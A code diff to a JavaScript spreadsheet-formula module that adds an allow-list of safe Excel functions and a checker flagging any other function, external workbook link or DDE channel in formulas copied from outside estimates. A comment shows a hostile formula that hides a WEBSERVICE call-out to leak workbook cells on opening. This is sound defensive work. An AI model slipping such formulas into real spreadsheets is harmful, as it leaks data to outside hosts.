@@ -87,5 +87,44 @@
     };
   }
 
-  S.formula = { translate: translate, translateMap: translateMap, tableMap: tableMap };
+  /*
+   * Which of an estimate's formulas may go into the document alive.
+   *
+   * A formula of the estimate is copied into the comparison table as a formula — that is the point of the
+   * table. But the estimate comes from outside and the table is signed and sent on, and a formula can do more
+   * than add: =SUM(G8:G15)+0*LEN(WEBSERVICE("http://…")) is a total that also calls an address when the
+   * document is opened, and can put any cell of the workbook into that address. So a formula is carried alive
+   * only when every function in it is one of those below — arithmetic, rounding, conditions, counting and
+   * look-ups inside the sheet: what an estimate's totals and overheads are made of. Anything else is written
+   * as the number the estimate itself shows for it, and counted, so that it is never done silently.
+   *
+   * A list of what is allowed, not of what is forbidden: a function added to Excel next year is not on it.
+   */
+  var SAFE = {};
+  ('SUM SUMIF SUMIFS SUMPRODUCT PRODUCT QUOTIENT MOD POWER SQRT ABS SIGN EXP LN LOG LOG10 PI ' +
+   'ROUND ROUNDUP ROUNDDOWN INT TRUNC CEILING FLOOR MROUND EVEN ODD CEILING.MATH FLOOR.MATH ' +
+   'MIN MAX AVERAGE MEDIAN LARGE SMALL COUNT COUNTA COUNTBLANK COUNTIF COUNTIFS SUBTOTAL ' +
+   'IF IFS IFERROR IFNA AND OR NOT XOR TRUE FALSE ISBLANK ISNUMBER ISTEXT ISERROR ISERR ISNA N VALUE ' +
+   'VLOOKUP HLOOKUP LOOKUP INDEX MATCH CHOOSE ' +
+   'CONCATENATE CONCAT LEFT RIGHT MID LEN TRIM UPPER LOWER TEXT FIXED').split(' ').forEach(function (n) { SAFE[n] = true; });
+  var CALL = /([A-Za-z_\u0400-\u04FF][A-Za-z0-9_.\u0400-\u04FF]*)\s*\(/g;
+
+  /**
+   * The functions of `f` that are not on the list (upper case, each once); an empty list means the formula may
+   * be carried alive. A link to another workbook («[1]Лист1!A1») or a DDE channel («cmd|…») counts as one too.
+   */
+  function unsafe(f) {
+    if (typeof f !== 'string' || !f) return [];
+    var body = f.replace(STR, '""'), out = {}, m;
+    CALL.lastIndex = 0;
+    while ((m = CALL.exec(body))) {
+      var name = m[1].toUpperCase().replace(/^_XLFN\.(_XLWS\.)?/, '');
+      if (!SAFE[name]) out[name] = true;
+    }
+    if (body.indexOf('[') >= 0) out['[…]'] = true;
+    if (body.indexOf('|') >= 0) out['|'] = true;
+    return Object.keys(out);
+  }
+
+  S.formula = { translate: translate, translateMap: translateMap, tableMap: tableMap, unsafe: unsafe };
 })(S);
